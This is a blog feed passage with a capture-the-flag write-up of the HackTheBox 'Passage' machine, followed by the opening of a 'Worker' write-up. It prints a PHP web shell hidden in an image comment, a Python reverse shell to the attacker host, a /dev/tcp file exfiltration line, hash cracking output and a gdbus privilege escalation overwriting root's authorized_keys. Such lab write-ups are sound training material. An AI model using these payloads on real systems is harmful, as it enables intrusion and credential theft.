<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN initial-passage -v 10.10.10.206
<span class="c1"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
Nmap scan report <span class="k">for</span> 10.10.10.206
Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-methods:
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Passage News
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><img class="img-container" src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  />
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><img class="img-container" src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  />
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname as <code>passage.htb</code>.</p>
<p><img class="img-container" src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  />
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><img class="img-container" src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  />
</p>
<p>I can register as normal user.</p>
<p><img class="img-container" src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  />
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ searchsploit <span class="s1">&#39;CuteNews 2.1.2&#39;</span>
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     <span class="p">|</span>  Path
------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - <span class="s1">&#39;avatar&#39;</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>       <span class="p">|</span> php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                           <span class="p">|</span> php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload               <span class="p">|</span> php/webapps/48458.txt
------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><img class="img-container" src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  />
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class="o">=</span>python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ rlwrap nc -nvlp <span class="m">9001</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">37062</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
www-data@passage:/var/www/html/CuteNews/uploads$
www-data@passage:/var/www/html/CuteNews/uploads$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
ls -l /home
total <span class="m">8</span>
drwxr-x--- <span class="m">17</span> nadav nadav  <span class="m">4096</span> Mar <span class="m">5</span> 09:21 nadav
drwxr-x--- <span class="m">17</span> paul  paul   <span class="m">4096</span> Mar <span class="m">5</span> 08:32 paul
</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><img class="img-container" src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  />
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ nc -nvlp <span class="m">9000</span> &gt; cdata.users
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">55022</span>
</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:16:<span class="s2">&#34;paul@passage.htb&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;paul-coles&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:1598829833<span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;ahaha@gmail.com&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;ivanpogi&#34;</span><span class="p">;</span><span class="o">}}</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;egre55@test.com&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>a:11:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;1599412470&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:3:<span class="s2">&#34;acl&#34;</span><span class="p">;</span>s:1:<span class="s2">&#34;4&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>s:13:<span class="s2">&#34;debo@debo.com&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;nick&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;pass&#34;</span><span class="p">;</span>s:64:<span class="s2">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;more&#34;</span><span class="p">;</span>s:60:<span class="s2">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;avatar&#34;</span><span class="p">;</span>s:20:<span class="s2">&#34;avatar_debo_bash.php&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>And that was a mess.</p>
<p>Among those outputs, this one concerns me.</p>
<pre><code>&quot;pass&quot;;s:64:&quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&quot;
</code></pre><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
   <span class="c1">#########################################################################</span>
   <span class="c1">#     __  __                     __           ______    _____           #</span>
   <span class="c1">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
   <span class="c1">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
   <span class="c1">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
   <span class="c1">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
   <span class="c1">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
   <span class="c1">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
   <span class="c1">#                                                             By Zion3R #</span>
   <span class="c1">#                                                    www.Blackploit.com #</span>
   <span class="c1">#                                                   Root@Blackploit.com #</span>
   <span class="c1">#########################################################################</span>
--------------------------------------------------

Possible Hashs:
<span class="o">[</span>+<span class="o">]</span> SHA-256
<span class="o">[</span>+<span class="o">]</span> Haval-256
...&lt;SNIP&gt;...
</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><img class="img-container" src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  />
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> grep -o -E -e <span class="s2">&#34;[0-9a-f]{64}&#34;</span>
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ./hashcat.exe -m <span class="m">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@passage:/home$ su paul 
su paul
Password: atlanta1
paul@passage:~$ 
</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ cat id_rsa.pub <span class="o">&amp;&amp;</span> authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ ssh nadav@passage.htb
Last login: Sun Sep  <span class="m">6</span> 11:12:03 <span class="m">2020</span> from 127.0.0.1
nadav@passage:~$ id
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file.</p>
<p><img class="img-container" src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  />
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g


...&lt;SNIP&gt;...
# File marks:
&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        &#34;       12      7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        &#34;       2       0
        .       2       0
        +       2       0
</code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
<span class="o">[</span>Configuration<span class="o">]</span>
<span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<span class="cp">&lt;!DOCTYPE busconfig PUBLIC
</span><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
<span class="nt">&lt;busconfig&gt;</span>

  <span class="c">&lt;!-- Only root can own the service --&gt;</span>
  <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/policy&gt;</span>

  <span class="c">&lt;!-- Allow anyone to invoke methods (further constrained by
</span><span class="c">       PolicyKit privileges --&gt;</span>
  <span class="nt">&lt;policy</span> <span class="na">context=</span><span class="s">&#34;default&#34;</span><span class="nt">&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Properties&#34;</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/policy&gt;</span>

<span class="nt">&lt;/busconfig&gt;</span>
</code></pre></div><p>From here, From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><img class="img-container" src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  />
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ uname -a
Linux passage 4.15.0-45-generic <span class="c1">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class="nb">true</span>
<span class="nb">true</span>
<span class="o">()</span>
</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «passage» «10.10.14.31»
$ ssh -i root_rsa root@10.10.10.206
Last login: Fri Mar  5 17:33:39 2020 from 10.10.14.7
root@passage:~# ls -l
total 12
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
-r-------- 1 root root   33 Mar  5 17:05 root.txt
root@passage:~# 
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Worker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
      <description>Learn how Azure Pipelines can be exploited</description>
      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SVN enumeration</li>
<li>Windows enumeration</li>
<li>Exploiting Azure Pipelines</li>
